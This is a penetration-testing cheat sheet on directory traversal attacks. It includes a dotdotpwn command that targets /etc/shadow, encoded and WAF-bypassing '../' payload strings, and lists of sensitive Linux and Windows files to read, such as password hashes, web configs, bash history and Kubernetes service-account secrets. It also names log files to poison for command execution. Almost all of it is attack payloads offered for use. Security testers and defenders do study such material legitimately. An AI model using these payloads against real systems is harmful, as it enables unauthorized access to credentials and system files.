# Directory traversal

> A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing "traverse to parent directory" are passed through to the file APIs.

## Summary

* [Tools](#tools)
* [Basic exploitation](#basic-exploitation)
* [Path Traversal](#path-traversal)

## Tools

- [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
    ```powershell
    git clone https://github.com/wireghoul/dotdotpwn
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## Basic exploitation

We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

16 bit Unicode encoding

```powershell
. = %u002e
/ = %u2215
\ = %u2216
```

UTF-8 Unicode encoding

```powershell
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.

```powershell
..././
...\.\
```

Double URL encoding

```powershell
. = %252e
/ = %252f
\ = %255c
```


## Path Traversal

Linux - Interesting files to check out :

```powershell
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
```

Windows - Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)

```powershell
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
```

The following log files are controllable and can be included with an evil payload to achieve a command execution

```powershell
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

Other easy win files.

```powershell
/proc/self/cwd/index.php
/home/$USER/.bash_history
/var/run/secrets/kubernetes.io/serviceaccount
```


## References

* [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
